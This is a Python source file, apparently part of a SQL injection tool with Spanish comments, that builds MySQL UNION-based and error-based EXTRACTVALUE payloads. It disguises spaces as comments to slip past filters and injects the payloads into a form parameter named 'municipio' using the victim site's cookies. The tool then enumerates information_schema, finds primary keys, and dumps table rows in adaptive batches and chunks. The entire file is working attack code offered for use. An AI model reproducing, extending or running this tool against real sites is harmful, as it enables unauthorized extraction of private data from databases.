import time
import re
import requests
import random

class BuhoRacionalDump:
    def __init__(self, config):
        self.config = config
        self.MAX_LEN_ERROR = 32 # Límite típico de error-based (MySQL ~32 chars visibles)
        
    def _tamper(self, payload):
        metodo = self.config.get('tamper', 'space2comment')
        if metodo == 'space2comment':
            return payload.replace(" ", "/**/")
        return payload

    def _make_request(self, sql_query):
        # --- STRATEGY SELECTION ---
        # Prioritize explicit 'injection_type' from config
        inj_type = self.config.get('injection_type')
        
        use_union = False
        
        if inj_type == 'union':
            use_union = True
        elif inj_type == 'error':
            use_union = False
        else:
            # Auto-detect based on params availability (Legacy/Fallback)
            union_idx = self.config.get('union_visible_idx')
            union_cols = self.config.get('union_columns')
            if union_idx and union_cols:
                use_union = True

        # Validate Union Params if selected
        if use_union:
            try:
                union_idx = int(self.config.get('union_visible_idx', 0))
                union_cols = int(self.config.get('union_columns', 0))
                if union_idx <= 0 or union_cols <= 0:
                    use_union = False # Fallback to error if params invalid
            except:
                use_union = False

        if use_union:
             try:
                 # --- UNION STRATEGY IMPLEMENTATION ---
                 # Construir payload: 022 AND 0 UNION ALL SELECT 1,2,3...
                 # En la posición 'union_idx', ponemos nuestra query envuelta en marcadores
                 
                 # Marcadores para regex (HTML-friendly)
                 # Usamos 0x7e (~) para evitar colisiones con tags HTML
                 prefix = "0x7e" # ~
                 suffix = "0x7e" # ~
                 
                 # Query Payload: CONCAT(0x7e, (QUERY), 0x7e)
                 # Usamos CAST o IFNULL para evitar errores de tipo NULL
                 injected_query = f"CONCAT({prefix},IFNULL(({sql_query}),0x20),{suffix})"
                 
                 # Armar lista de columnas 1,2,3...
                 columns_payload = []
                 for i in range(1, union_cols + 1):
                     if i == union_idx:
                         columns_payload.append(injected_query)
                     else:
                         # Usar NULL o un entero pequeño para otras columnas para evitar errores de tipo
                         columns_payload.append("11") 
                 
                 union_payload = ",".join(columns_payload)
                 
                 # ID negativo (-1) para anular query original y forzar UNION
                 final_payload = f"-1 UNION ALL SELECT {union_payload}--"
                 
                 injection = self._tamper(final_payload)
                 
                 # LOGGING
                 if hasattr(self.config, 'get') and self.config.get('log_callback'):
                      short_query = sql_query[:60] + "..." if len(sql_query) > 60 else sql_query
                      self.config['log_callback']("PAYLOAD", f"[UNION] {short_query}")
                 
                 # Send Request
                 headers = {
                    "Host": self.config.get('host'),
                    "Cookie": self.config.get('cookies'),
                    "User-Agent": self.config.get('user_agent', 'Mozilla/5.0'),
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Referer": self.config.get('referer', '')
                 }
                 data = self.config.get('post_data', {}).copy()
                 target_param = "municipio"
                 if target_param not in data and data: target_param = list(data.keys())[0]
                 data[target_param] = injection
                 
                 time.sleep(self.config.get('delay', 0.5))
                 url = self.config.get('url')
                 
                 if self.config.get('method', 'POST') == 'POST':
                    resp = requests.post(url, headers=headers, data=data, timeout=10)
                 else:
                    resp = requests.get(url, headers=headers, params=data, timeout=10)
                 
                 # Parse Result: ~RESULT~
                 # Regex: ~(.*?)~
                 # Usamos 0x7e (~)
                 
                 # Log Debug
                 if hasattr(self.config, 'get') and self.config.get('log_callback'):
                     self.config['log_callback']("DEBUG", f"UNION Resp Len: {len(resp.text)}")

                 match = re.search(r"~(.*?)~", resp.text, re.DOTALL)
                 if match:
                     val = match.group(1)
                     if hasattr(self.config, 'get') and self.config.get('log_callback'):
                        self.config['log_callback']("SUCCESS", f"Extracted: {val[:30]}...")
                     return val, False
                 
                 # If Union fails to match marker, it might be a silent failure or structure error.
                 # Fall through to Error-Based is safer? No, usually distinct.
                 return None, False

             except Exception as e:
                 if hasattr(self.config, 'get') and self.config.get('log_callback'):
                      self.config['log_callback']("ERROR", f"Union Failed: {e}")
                 # On Exception, we return None to stop.
                 return None, False

        # --- FALLBACK: ERROR-BASED STRATEGY (OLD) ---
        # Si no hay config de UNION válida, usamos Error-Based.
        
        payload_marker = f"022 AND EXTRACTVALUE(1,CONCAT(0x7e,({sql_query}),0x7e))--"
        injection = self._tamper(payload_marker)
        
        # LOGGING (Callbacks)
        if hasattr(self.config, 'get') and self.config.get('log_callback'):
             # Simplificamos log para no saturar
             short_query = sql_query[:50] + "..." if len(sql_query) > 50 else sql_query
             self.config['log_callback']("PAYLOAD", f"[ERROR] {short_query}")
        
        headers = {
            "Host": self.config.get('host'),
            "Cookie": self.config.get('cookies'),
            "User-Agent": self.config.get('user_agent', 'Mozilla/5.0'),
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Referer": self.config.get('referer', '')
        }
        
        # Clonar y preparar data
        data = self.config.get('post_data', {}).copy()
        # Inyectar en el parámetro objetivo
        target_param = "municipio"
        if target_param not in data and data:
            target_param = list(data.keys())[0]
            
        data[target_param] = injection
        
        try:
            time.sleep(self.config.get('delay', 0.5))
            url = self.config.get('url')
            if self.config.get('method', 'POST') == 'POST':
                response = requests.post(url, headers=headers, data=data, timeout=10)
            else:
                response = requests.get(url, headers=headers, params=data, timeout=10)
            
            # Log Response Status
            if hasattr(self.config, 'get') and self.config.get('log_callback'):
                 self.config['log_callback']("DEBUG", f"Status: {response.status_code} | Len: {len(response.text)}")

            # Análisis de Respuesta
            match = re.search(r"XPATH syntax error: '~(.*?)~'", response.text)
            if match:
                val = match.group(1)
                # Log Success
                if hasattr(self.config, 'get') and self.config.get('log_callback'):
                    self.config['log_callback']("SUCCESS", f"Extracted: {val[:30]}...")
                return val, False 
            
            # Truncamiento severo (sin cierre)
            match_partial = re.search(r"XPATH syntax error: '~(.*)", response.text)
            if match_partial:
                val = match_partial.group(1).split("'")[0]
                if hasattr(self.config, 'get') and self.config.get('log_callback'):
                    self.config['log_callback']("WARNING", f"Truncated: {val[:30]}...")
                return val, True 
                
            return None, False
        except Exception as e:
            if hasattr(self.config, 'get') and self.config.get('log_callback'):
                 self.config['log_callback']("ERROR", f"Req Failed: {e}")
            return None, False

    def count_records(self, db, table, where_clause=None):
        """Cuenta el total de registros en una tabla específica"""
        base_target = f"{db}.{table}"
        if where_clause:
            base_target += f" WHERE {where_clause}"
            
        query = f"SELECT COUNT(*) FROM {base_target}"
        val, _ = self._make_request(query)
        if val and val.isdigit():
            return int(val)
        return -1

    def get_primary_key(self, db, table):
        """Detecta la llave primaria de una tabla"""
        # Convertir a hex para evitar problemas de comillas
        import binascii
        def to_hex(s): return "0x" + binascii.hexlify(s.encode()).decode()
        
        db_hex = to_hex(db)
        tb_hex = to_hex(table)
        
        query = f"column_name FROM information_schema.columns WHERE table_schema={db_hex} AND table_name={tb_hex} AND column_key='PRI'"
        val, _ = self._make_request(query)
        return val

    def _get_optimal_batch_size(self, total_count, entity_type="generic"):
        """
        Calcula el tamaño de lote inicial basado en la cantidad total de elementos.
        """
        if entity_type == "dbs":
            if total_count > 12: return 4
            if total_count > 5: return 2
            return 1
        elif entity_type == "tables":
            if total_count > 200: return 15 # Agresivo si hay muchas
            if total_count > 50: return 8
            if total_count > 15: return 4
            return 2
        elif entity_type == "columns":
            if total_count > 20: return 5
            return 3
        return 1

    def _extract_chunked(self, query_base, offset_row):
        """Extrae un dato largo pedazo a pedazo"""
        full_data = ""
        pos = 1
        found_any = False
        
        while True:
            # MySQL SUBSTRING start at 1
            # Extraer 30 caracteres
            chunk_query = f"SUBSTRING(({query_base} LIMIT 1 OFFSET {offset_row}), {pos}, 30)"
            val, _ = self._make_request(chunk_query)
            
            if not val: 
                break
            
            found_any = True
            full_data += val
            
            # Si el pedazo es menor que el tamaño pedido, es el final
            if len(val) < 30: break
            
            pos += 30
            
            # Safety break para evitar bucles infinitos en errores
            if pos > 10000: break 
            
        return full_data if found_any else None

    def smart_dump(self, query_col, query_table, entity_type="generic", progress_callback=None, start_offset=0, limit=None, force_single=False, known_total=None, user_batch_size=None):
        """
        Algoritmo Maestro de Extracción (Generador):
        Yields (batch_results, total_count, current_batch_size)
        """
        # 1. Obtener Total (Optimizado)
        if known_total is not None:
            total_count = known_total
            if force_single:
                batch_size = 1
            elif user_batch_size:
                batch_size = user_batch_size
            else:
                batch_size = self._get_optimal_batch_size(total_count, entity_type)
            mode_blind = False
        else:
            # Si es generic (datos) y query_col es complejo (tiene parentesis), usar COUNT(*)
            if entity_type == "generic" and "(" in query_col:
                 count_query = f"SELECT COUNT(*) FROM {query_table}"
            else:
                 count_query = f"SELECT COUNT({query_col}) FROM {query_table}"
                 
            total_str, _ = self._make_request(count_query)
            
            if not total_str or not total_str.isdigit():
                # Fallback si falla conteo: modo ciego lote pequeño
                total_count = 1000 # Límite arbitrario alto
                batch_size = 1
                mode_blind = True
            else:
                total_count = int(total_str)
                if force_single:
                    batch_size = 1
                elif user_batch_size:
                    batch_size = user_batch_size
                else:
                    batch_size = self._get_optimal_batch_size(total_count, entity_type)
                mode_blind = False
            
        results = []
        # Offset inicial controlado
        offset = start_offset
        
        # Límite efectivo: el menor entre (total - offset) y el limit solicitado
        if limit is not None:
            # Si piden 10 filas desde offset 5, queremos extraer hasta que results tenga 10.
            # Ojo: total_count sigue siendo el total de la DB, pero nuestro objetivo es el limit.
            target_count = limit
        else:
            target_count = total_count - offset
            
        # Bucle de extracción
        # Condición: No superar el límite solicitado.
        # Eliminamos la condición estricta 'offset < total_count' si hay límite explícito
        # para evitar paradas prematuras si total_count está mal estimado.
        while len(results) < target_count:
            if offset >= total_count and limit is None:
                 # Si no hay límite explícito y nos pasamos del total, paramos.
                 # Pero si HAY límite, seguimos intentando hasta que la DB no devuelva nada.
                 break
            
            if progress_callback:
                progress_callback(len(results), target_count, f"Batch size: {batch_size}")
            
            # Ajustar lote al remanente
            remaining = target_count - len(results)
            # También asegurarse de no pasarse del total de la tabla (solo si confiamos en total)
            # Si limit está puesto, ignoramos remaining_in_table para forzar intento
            
            if limit is not None:
                current_batch = min(batch_size, remaining)
            else:
                remaining_in_table = total_count - offset
                current_batch = min(batch_size, remaining, remaining_in_table)

            if current_batch <= 0: break
            
            # Query de Lote
            inner = f"SELECT {query_col} FROM {query_table} LIMIT {current_batch} OFFSET {offset}"
            
            # NO usar GROUP_CONCAT en modo HEX-SAFE si es generic (datos)
            # Porque GROUP_CONCAT tiene limite de 1024 chars y rompe HEX largos.
            # En su lugar, hacemos iteración normal si es modo single (ya forzado por alta densidad)
            # O usamos un truco: Si es generic, el dumper ya espera un string largo HEX.
            # Pero si son multiples filas (batch > 1), necesitamos separarlas.
            
            if entity_type == "generic" and batch_size == 1:
                 # Si es 1 sola fila, no necesitamos group_concat externo
                 batch_query = f"SELECT {query_col} FROM {query_table} LIMIT 1 OFFSET {offset}"
            else:
                 # Usamos un separador único <R> (0x3c523e) para evitar colisiones con datos que contengan |
                 batch_query = f"SELECT GROUP_CONCAT({query_col} SEPARATOR 0x3c523e) FROM ({inner})x"
            
            val, truncated = self._make_request(batch_query)
            
            # Lógica de Adaptación
            is_effectively_truncated = truncated
            
            if val and not is_effectively_truncated:
                # ÉXITO
                if entity_type == "generic" and batch_size == 1:
                    # En modo single generic, val es el HEX crudo de una fila
                    # PERO: si usamos CONCAT_WS(0x7c, ...), el resultado es un string HEX único.
                    # Debemos devolverlo tal cual, pero gui_exploit.py espera un array.
                    # El problema es que si el HEX es muy largo, aquí no hay '|' para separar filas,
                    # porque es 1 sola fila.
                    parts = [val]
                else:
                    parts = val.split('<R>')
                
                # Yield results immediately
                yield parts, total_count, batch_size
                
                results.extend(parts)
                offset += len(parts)
                
                # Optimización de subida de batch
                if len(val) < 28 and current_batch < 15:
                    batch_size += 1
            else:
                # FALLO (Truncado o Error)
                if current_batch > 1:
                    # Reducir batch
                    if current_batch <= 5:
                        batch_size = current_batch - 1
                    else:
                        batch_size = max(1, current_batch // 2)
                    continue 
                else:
                    # Lote es 1 y falló -> Dato Largo -> Chunking
                    if val is None and mode_blind:
                        break 
                    
                    # Intentar Chunking
                    # IMPORTANTE: Si estamos en modo generic HEX, la query base debe ser la misma HEX(...)
                    # Si no, chunking sacará texto plano y romperá el decodificador HEX del GUI.
                    
                    if entity_type == "generic":
                         # Reconstruir la query HEX interna para chunking
                         # query_col ya trae "HEX(CONCAT_WS(...))" desde gui_exploit
                         chunk_base = f"SELECT {query_col} FROM {query_table}"
                    else:
                         chunk_base = f"SELECT {query_col} FROM {query_table}"

                    full_val = self._extract_chunked(chunk_base, offset)
                    
                    if full_val:
                        yield [full_val], total_count, batch_size
                        results.extend([full_val])
                        offset += 1
                        batch_size = 2 
                    else:
                        break 
                        
        return results, total_count
